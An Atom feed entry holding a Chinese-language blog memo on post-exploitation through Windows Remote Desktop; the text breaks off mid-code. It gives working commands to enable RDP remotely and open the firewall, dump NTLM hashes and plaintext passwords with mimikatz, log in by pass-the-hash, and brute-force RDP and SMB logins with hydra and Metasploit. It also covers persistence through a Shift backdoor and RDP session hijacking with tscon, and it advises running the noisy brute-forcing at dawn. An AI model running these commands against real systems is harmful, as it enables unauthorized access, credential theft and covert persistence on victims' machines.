<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>m0nk3y&#39;s Blog @ D0g3</title>
  
  
  <link href="https://hack-for.fun/atom.xml" rel="self"/>
  
  <link href="https://hack-for.fun/"/>
  <updated>2021-06-24T03:17:51.985Z</updated>
  <id>https://hack-for.fun/</id>
  
  <author>
    <name>m0nk3y</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>内网渗透备忘录</title>
    <link href="https://hack-for.fun/d789.html"/>
    <id>https://hack-for.fun/d789.html</id>
    <published>2021-06-21T03:06:28.000Z</published>
    <updated>2021-06-24T03:17:51.985Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210624111457.png"></p><p>欢迎关注公众号，以后博客不更新了，文章都在公众号发。</p><h1 id="不同版本Windows开启RDP"><a href="#不同版本Windows开启RDP" class="headerlink" title="不同版本Windows开启RDP"></a>不同版本Windows开启RDP</h1><p>可以连接到运行以下 Windows 操作系统的电脑：</p><ul><li>Windows 10 专业版</li><li>Windows 10 企业版</li><li>Windows 8 企业版</li><li>Windows 8 专业版</li><li>Windows 7 专业版</li><li>Windows 7 企业版</li><li>Windows 7 旗舰版</li><li>Windows 7 旗舰版</li><li><strong>Windows 2008 Server</strong></li><li><strong>Windows Server 2008 R2</strong></li><li><strong>Windows Server 2012</strong></li><li><strong>Windows Server 2012 R2</strong></li><li><strong>Windows Server 2016</strong></li><li>Windows Multipoint Server 2011</li><li>Windows Multipoint Server 2012</li><li>Windows Small Business Server 2008</li><li>Windows Small Business Server 2011</li></ul><p>以下计算机可以运行远程桌面网关：</p><ul><li>Windows 2008 Server</li><li>Windows Server 2008 R2</li><li>Windows Server 2012</li><li>Windows Server 2012 R2</li><li>Windows Server 2016</li><li>Windows Small Business Server 2011</li></ul><p>以下操作系统可用作 RD Web 访问或 RemoteApp 服务器：</p><ul><li>Windows Server 2008 R2</li><li>Windows Server 2012</li><li>Windows Server 2012 R2</li><li>Windows Server 2016</li></ul><p>远程桌面客户端不会连接到以下 Windows 版本：</p><ul><li>Windows 7 简易版</li><li>Windows 7 家庭版</li><li>Windows 8 家庭版</li><li>Windows 8.1 家庭版</li><li>Windows 10 家庭版</li></ul><h2 id="判断是否开启RDP"><a href="#判断是否开启RDP" class="headerlink" title="判断是否开启RDP"></a>判断是否开启RDP</h2><p><em>默认情况下，Window XP和 server 2003上的远程桌面未启用</em> ，通过下面的注册表查询可以知道目标机器是否开启了RDP服务</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections </span><br><span class="line"># 查看RDP服务是否开启：1关闭，0开启 </span><br><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</span><br><span class="line"></span><br><span class="line"># 查看RDP服务的端口</span><br></pre></td></tr></table></figure><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621113523181.png)</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621113556564.png)</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621114128380.png)</p><p>16进制 d3d 就是 10进制的 3389</p><p>方法二，通过查看进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist &#x2F;svc | find &quot;TermService&quot; # 找到对应服务进程的PID</span><br><span class="line">netstat -ano | find &quot;844&quot; # 找到进程对应的端口号</span><br></pre></td></tr></table></figure><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621114506770.png)</p><h2 id="通过注册表开启RDP"><a href="#通过注册表开启RDP" class="headerlink" title="通过注册表开启RDP"></a>通过注册表开启RDP</h2><h3 id="reg文件"><a href="#reg文件" class="headerlink" title="reg文件"></a>reg文件</h3><p>第一种方法也是用”echo”命令写入一个 3389.reg文件，再”regedit /s 3389.reg”导入注册表文件即可开启，比较简单。将如下代码一行一行地复制到cmdshell窗口后按回车执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo Windows Registry Editor Version 5.00 &gt;3389.reg</span><br><span class="line">echo. &gt;&gt;3389.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal Server] &gt;&gt;3389.reg</span><br><span class="line">echo &quot;fDenyTSConnections&quot;&#x3D;dword:00000000 &gt;&gt;3389.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal ServerWdsdpwdTds cp] &gt;&gt;3389.reg</span><br><span class="line">echo &quot;PortNumber&quot;&#x3D;dword:00000d3d &gt;&gt;3389.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp] &gt;&gt;3389.reg</span><br><span class="line">echo &quot;PortNumber&quot;&#x3D;dword:00000d3d &gt;&gt;3389.reg</span><br></pre></td></tr></table></figure><p>完成以上操作后再执行”regedit /s 3389.reg”导入注册表即可生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">版本Windows 10 专业版</span><br><span class="line">版本号21H1</span><br><span class="line">安装日期2021&#x2F;6&#x2F;19</span><br><span class="line">操作系统内部版本19043.928</span><br><span class="line">体验Windows Feature Experience Pack 120.2212.551.0</span><br></pre></td></tr></table></figure><p>出现了UAC</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621115651613.png)</p><h3 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f</span><br></pre></td></tr></table></figure><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621120045039.png)</p><p>因此，要想开启RDP，首先是获得了系统的管理员权限。</p><p><strong>注：</strong></p><p>如果修改连接端口，<strong>系统重启后才能生效</strong></p><p><strong>补充</strong></p><p><strong>如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则允许3389端口</strong></p><p>修改防火墙配置，允许3389端口的命令如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure><h2 id="通过wmic开启RDP"><a href="#通过wmic开启RDP" class="headerlink" title="通过wmic开启RDP"></a>通过wmic开启RDP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;node: &quot;192.168.1.160&quot; &#x2F;USER:&quot;192.168.1.160\administrator&quot; PATH win32_erminalservicesetting WHERE (__Class!&#x3D;&quot;&quot;) CALL SetAllowTSConnections 1 # 需要输入远程机器上管理员密码</span><br></pre></td></tr></table></figure><h2 id="添加用户到Remote-Desktop-Users组"><a href="#添加用户到Remote-Desktop-Users组" class="headerlink" title="添加用户到Remote Desktop Users组"></a>添加用户到Remote Desktop Users组</h2><p>查看本地所有工作组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup</span><br></pre></td></tr></table></figure><p>查看Administrator组内的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup Administrators</span><br></pre></td></tr></table></figure><p>查看Remote Desktop Users组内的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Remote Desktop Users&quot;</span><br></pre></td></tr></table></figure><p>赋予非administrator组用户远程桌面登录权限，也即把目标用户加入Remote Desktop Users组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Remote Desktop Users&quot; username &#x2F;add </span><br></pre></td></tr></table></figure><p>此后username具有远程登录的权限，登录完成后将username在Remote Desktop Users组中删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Remote Desktop Users&quot; username &#x2F;del</span><br></pre></td></tr></table></figure><h2 id="RDP登录"><a href="#RDP登录" class="headerlink" title="RDP登录"></a>RDP登录</h2><h3 id="Windows-明文登录"><a href="#Windows-明文登录" class="headerlink" title="Windows 明文登录"></a>Windows 明文登录</h3><ol><li>mstsc.exe</li><li>mstsc.exe /console /v:ip/admin   # 如果登录用户数量达到限制，可以使用该命令强制踢出一个用户</li></ol><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621195256529.png)</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621200056069.png)</p><p>被踢下线</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621200125104.png)</p><h3 id="Windows-使用-Hash-登录"><a href="#Windows-使用-Hash-登录" class="headerlink" title="Windows 使用 Hash 登录"></a>Windows 使用 Hash 登录</h3><h4 id="mstsc"><a href="#mstsc" class="headerlink" title="mstsc"></a>mstsc</h4><p>Server需要开启 <strong>Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持；Client需要支持 Restricted Admin mode</strong>，当前系统不支持，链接时将出现如下：</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621202739352.png)</p><p>可以通过如下命令开启 Restricted Admin mode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure><p>查看是否已经开启</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; | findstr &quot;DisableRestrictedAdmin&quot;</span><br></pre></td></tr></table></figure><p>开启后使用：mstsc.exe /restrictedadmin 进行登录不需要密码，将使用当前用户的hash进行验证</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621202945033.png)</p><p>还有一个条件就是本地有rdp的凭据，不然就会下面这样</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621203044329.png)</p><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><ol><li>mimikatz.exe # 需要管理员权限</li><li>privilege::debug</li><li>sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:d25ecd13fddbb542d2e16da4f9e0333d “/run:mstsc.exe /restrictedadmin”</li></ol><h4 id="mimikatz-抓取hash"><a href="#mimikatz-抓取hash" class="headerlink" title="mimikatz 抓取hash"></a>mimikatz 抓取hash</h4><p>在Windows2000以后，Windows机器都用NTLM算法在本地保存用户的密码，密码的NTLM哈希保存在<code>%SystemRoot%\System32\config\SAM</code>文件中。 Windows操作系统通常使用两种方法对用户的密码进行哈希处理，即 LAN Manager（LM）哈希和 NT LAN Manager（NTLM）哈希。所谓哈希（Hash），即使用一种加密方法对明文密码进行加密，对一个任意长度的字符串数据进行一次加密运算，都可以返回一个固定长度的字符串。Windows加密过的密码口令，我们称之为Hash。</p><p>Windows操作系统中的密码一般由两部分组成：一部分为LM Hash，另一部分为NTLM Hash。在Windows中，Hash的结构通常如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username:RID:LM-Hash:NT-Hash</span><br></pre></td></tr></table></figure><p>在windows2000以后的系统中，第一部分的 LM-hash 都是空值，因为LM-hash可以很容易的破解，所以windows2000之后这个值默认为空，所以第二部分的NTLM-hash才真正是用户密码的哈希值。</p><p>在渗透测试中，通常可<strong>从Windows系统中的SAM文件和域控的NTDS.dit文件（在域环境中，用户信息存储在NTDS.dit中）中获得所有用户的Hash。也可以通过Mimikatz读取lsass.exe进程获得已登录用户的NTLM hash和明文值 。</strong></p><blockquote><p>注：但是在安装了KB2871997补丁或者系统版本大于win10或windows server 2012时，默认在内存缓存中禁止保存明文密码，这样利用mimikatz就不能从内存中读出明文密码了，但可以通过修改注册表的方式抓取明文。</p></blockquote><p>Mimikatz读取明文密码和hash也时最常用的方法。需要管理员权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug      &#x2F;&#x2F; 提升至debug权限</span><br><span class="line">sekurlsa::logonpasswords       &#x2F;&#x2F; 抓取密码</span><br></pre></td></tr></table></figure><h3 id="Linux明文登录"><a href="#Linux明文登录" class="headerlink" title="Linux明文登录"></a>Linux明文登录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop ip:port</span><br></pre></td></tr></table></figure><h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621201013729.png)</p><hr><p>上面其实简单来说都是针对支持RDP的Windows server 操作系统的。还有Windows 7、8这些 没有server的。rdp服务如何开启？</p><h2 id="Windows-Server-03"><a href="#Windows-Server-03" class="headerlink" title="Windows Server 03"></a>Windows Server 03</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">开启：</span><br><span class="line">REG ADD \<span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span></span><br><span class="line"><span class="string">关闭：</span></span><br><span class="line"><span class="string">REG ADD \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span></span><br><span class="line"><span class="string">开启：</span></span><br><span class="line"><span class="string">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span></span><br><span class="line"><span class="string">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot;</span> <span class="string">&quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span></span><br><span class="line"><span class="string">REG ADD &quot;</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server<span class="string">&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !&#x3D; &quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure><h2 id="Windows-Xp"><a href="#Windows-Xp" class="headerlink" title="Windows Xp"></a>Windows Xp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !&#x3D; &quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure><h2 id="Windows-8"><a href="#Windows-8" class="headerlink" title="Windows 8"></a>Windows 8</h2><p>三条命令即可：</p><ol><li>wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != “”) call setallowtsconnections 1</li><li>wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call setuserauthenticationrequired 1</li><li>reg add “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</li></ol><p>或者reg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f</span><br></pre></td></tr></table></figure><h2 id="Windows-2012"><a href="#Windows-2012" class="headerlink" title="Windows 2012"></a>Windows 2012</h2><p>通用</p><h2 id="Windows-7"><a href="#Windows-7" class="headerlink" title="Windows 7"></a>Windows 7</h2><ol><li>wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != “”) call setallowtsconnections 1</li><li>wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call setuserauthenticationrequired 1</li></ol><p>以上前提条件是确保Windows Management Instrumentation（Winmgmt）服务已正常启动，权限为管理员权限。</p><h2 id="Windows-2016"><a href="#Windows-2016" class="headerlink" title="Windows 2016"></a>Windows 2016</h2><p>Server 2016 默认远程桌面连接数是 2 个用户，如果多余两个用户进行远程桌面连接时，系统就会提示超过连接数</p><p>使用powershell,</p><p>设置 fDenyTSConnections 为0，允许Terminal Services。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;HKLM:SystemCurrentControlSetControlTerminal Server&#x27;</span> <span class="literal">-Name</span> <span class="string">&#x27;fDenyTSConnections&#x27;</span> <span class="literal">-Value</span> <span class="number">0</span> <span class="literal">-PropertyType</span> dword <span class="literal">-Force</span></span><br></pre></td></tr></table></figure><p>开启用户验证，推荐默认开启，但是作为渗透测试的话，应该是可以不用的</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;HKLM:SystemCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp&#x27;</span> <span class="literal">-Name</span> <span class="string">&#x27;UserAuthentication&#x27;</span> <span class="literal">-Value</span> <span class="number">1</span> <span class="literal">-PropertyType</span> dword <span class="literal">-Force</span></span><br></pre></td></tr></table></figure><p>添加防火墙规则</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Enable-NetFirewallRule</span> <span class="literal">-DisplayGroup</span> <span class="string">&#x27;Remote Desktop&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Enable Remote Desktop</span></span><br><span class="line">(<span class="built_in">Get-WmiObject</span> Win32_TerminalServiceSetting <span class="literal">-Namespace</span> root\cimv2\TerminalServices).SetAllowTsConnections(<span class="number">1</span>,<span class="number">1</span>) | <span class="built_in">Out-Null</span></span><br><span class="line">(<span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> <span class="string">&quot;Win32_TSGeneralSetting&quot;</span> <span class="literal">-Namespace</span> root\cimv2\TerminalServices <span class="literal">-Filter</span> <span class="string">&quot;TerminalName=&#x27;RDP-tcp&#x27;&quot;</span>).SetUserAuthenticationRequired(<span class="number">0</span>) | <span class="built_in">Out-Null</span></span><br><span class="line"><span class="built_in">Get-NetFirewallRule</span> <span class="literal">-DisplayName</span> <span class="string">&quot;Remote Desktop*&quot;</span> | <span class="built_in">Set-NetFirewallRule</span> <span class="literal">-enabled</span> true</span><br></pre></td></tr></table></figure><h2 id="Windows-Server-2019"><a href="#Windows-Server-2019" class="headerlink" title="Windows Server 2019"></a>Windows Server 2019</h2><p>开启RDP服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path &#39;HKLM:\System\CurrentControlSet\Control\Terminal Server&#39; -name &quot;fDenyTSConnections&quot; -value 0</span><br></pre></td></tr></table></figure><p>添加防火墙规则允许RDP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-NetFirewallRule -DisplayGroup &quot;Remote Desktop&quot;</span><br></pre></td></tr></table></figure><h2 id="非服务器版本的Windows系统支持多用户登录的方法"><a href="#非服务器版本的Windows系统支持多用户登录的方法" class="headerlink" title="非服务器版本的Windows系统支持多用户登录的方法"></a>非服务器版本的Windows系统支持多用户登录的方法</h2><p>主要是3gstudent 师傅博客的思路，</p><blockquote><p>非服务器版本的Windows系统默认只允许一个账户登录</p></blockquote><p>具体表现为：</p><ul><li>远程登录时，使用与原系统相同的账户，原系统将被切换到登录界面</li><li>使用不同的账户，登录时提示其他用户已登录到此计算机</li><li>选择继续后，原系统桌面将弹框提示是否断开当前连接(30秒后默认选择同意，退回到登录界面)</li></ul><h3 id="1-使用mimikatz"><a href="#1-使用mimikatz" class="headerlink" title="1. 使用mimikatz"></a>1. 使用mimikatz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">ts::multirdp</span><br></pre></td></tr></table></figure><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622161621291.png)</p><p>开启多用户登录功能，最高支持到Win7</p><p><strong>使用与原系统相同的账户，原系统还是会被切换到登录界面</strong></p><p>使用与原系统不同的账户，登录成功。</p><h3 id="2-修改termsrv-dll"><a href="#2-修改termsrv-dll" class="headerlink" title="2. 修改termsrv.dll"></a>2. 修改termsrv.dll</h3><p>原理：Windows在开启服务Remote Desktop Services时，会加载termsrv.dl</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622161930740.png)</p><p>通过修改内存中的termsrv.dll实现开启多用户功能</p><p>不进一步深入了，技术水平还有限。</p><h3 id="3-使用rdpwrap"><a href="#3-使用rdpwrap" class="headerlink" title="3. 使用rdpwrap"></a>3. 使用rdpwrap</h3><p>当个jb小子比较适合我，所以看第三种方法，使用rdpwrap这个工具。</p><p><a href="https://github.com/stascorp/rdpwrap">https://github.com/stascorp/rdpwrap</a></p><p>C# 版本：<a href="https://github.com/infosecn1nja/SharpDoor">https://github.com/infosecn1nja/SharpDoor</a></p><blockquote><p>SharpDoor is alternative RDPWrap written in C# to allowed multiple RDP (Remote Desktop) sessions by patching termsrv.dll file, for opsec considerations SharpDoor still using cmd.exe to run sc services to impersonating as trustedinstaller in the future will be avoiding cmd.exe usage, currently <strong>only support for Windows 10.</strong></p></blockquote><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622162436228.png)</p><p>RDP Wrapper works as a layer between Service Control Manager and Terminal Services, so the original termsrv.dll file remains untouched. Also this method is very strong against Windows Update.</p><p>不修改termsrv.dll，通过传入不同参数实现</p><p>安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RDPWInst.exe -i is</span><br></pre></td></tr></table></figure><p>释放rdpwrap.dll和rdpwrap.ini至System32文件夹</p><p>rdpwrap.dll会被加载到同termsrv.dll相同的进程</p><p>此时，能够使用不同用户进行远程连接</p><p>卸载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RDPWInst.exe -u</span><br></pre></td></tr></table></figure><h2 id="确定RDP有效用户名"><a href="#确定RDP有效用户名" class="headerlink" title="确定RDP有效用户名"></a>确定RDP有效用户名</h2><h3 id="明文密码"><a href="#明文密码" class="headerlink" title="明文密码"></a>明文密码</h3><h4 id="RDP暴破"><a href="#RDP暴破" class="headerlink" title="RDP暴破"></a>RDP暴破</h4><p>超级弱口令（🐶）</p><p>Lodon <a href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a></p><p>Goby</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622211811732.png)</p><p>Hydra</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 192.168.1.2 rdp -L user.txt -P pass.txt -V</span><br></pre></td></tr></table></figure><h4 id="SMB爆破"><a href="#SMB爆破" class="headerlink" title="SMB爆破"></a>SMB爆破</h4><p>msf</p><p>auxiliary/scanner/smb/smb_login</p><p>Ladon</p><p><a href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a></p><p>Goby</p><p>不过这种暴破的，操作，太嚣张了，推荐凌晨的时候搞。</p><h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><p>Impacket工具包中的rdp_check.py 脚本可以通过hash确定目标机器是否存在枚举的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">usage: rdp_check.py [-h] [-hashes LMHASH:NTHASH] target</span><br><span class="line"></span><br><span class="line">Test whether an account is valid on the target host using the RDP protocol.</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  target                [[domain&#x2F;]username[:password]@]&lt;targetName or address&gt;</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line"></span><br><span class="line">authentication:</span><br><span class="line">  -hashes LMHASH:NTHASH</span><br><span class="line">                        NTLM hashes, format is LMHASH:NTHASH</span><br></pre></td></tr></table></figure><p>python rdp_check.py ./administrator@10.97.45.11 -hashes :618B18AD4171A53695DD997AB02D55C4</p><h2 id="RDP-权限维持"><a href="#RDP-权限维持" class="headerlink" title="RDP 权限维持"></a>RDP 权限维持</h2><p>原文地址：<a href="http://t3ngyu.leanote.com/post/LM-RDP">http://t3ngyu.leanote.com/post/LM-RDP</a></p><h3 id="1-关闭RDP-安全认证"><a href="#1-关闭RDP-安全认证" class="headerlink" title="1. 关闭RDP 安全认证"></a>1. 关闭RDP 安全认证</h3><p>​    当服务器开启安全认证时，必须先通过登陆密码才能进入远程桌面；如果服务端用的是不安全的认证方式，即可以先远程链接后登陆可以触发Shift后门</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622165057305.png)</p><p>如何设置不安全的连接，去掉”仅允许使用网络级别的身份验证的远程桌面的计算机连接”选项，需要注意的是<strong>先上系统后验证也会在计算机本地留下一定的进程、日志。</strong></p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622165215060.png)</p><h3 id="2-Shift后门-RDP-Session-劫持"><a href="#2-Shift后门-RDP-Session-劫持" class="headerlink" title="2. Shift后门 + RDP Session 劫持"></a>2. Shift后门 + RDP Session 劫持</h3><p>要用到的工具，tscon，微软自带。</p><p>配合上面的关闭RDP安全认证方式，利用<strong>Shift后门可以让攻击者快速获得System权限</strong>，结合RDP劫持可以实现无需创建用户、不更改劫持用户登录时间、解锁劫持用户界面、等功能。注意<strong>RDP劫持需要System权限</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tscon id # (要劫持的用户id，query user查看)</span><br></pre></td></tr></table></figure><p>另外一种方法可以通过创建服务激活：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc create rdpjack binpath&#x3D;&quot;cmd.exe &#x2F;k tscon 2 &#x2F;dest:console&quot;</span><br><span class="line">net start radjack # 执行后切换到目标界面下</span><br></pre></td></tr></table></figure><p>Mimikatz中也有相关的利用模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">ts::sessions</span><br><span class="line">ts::remote &#x2F;id:1</span><br><span class="line">privilege::debug</span><br><span 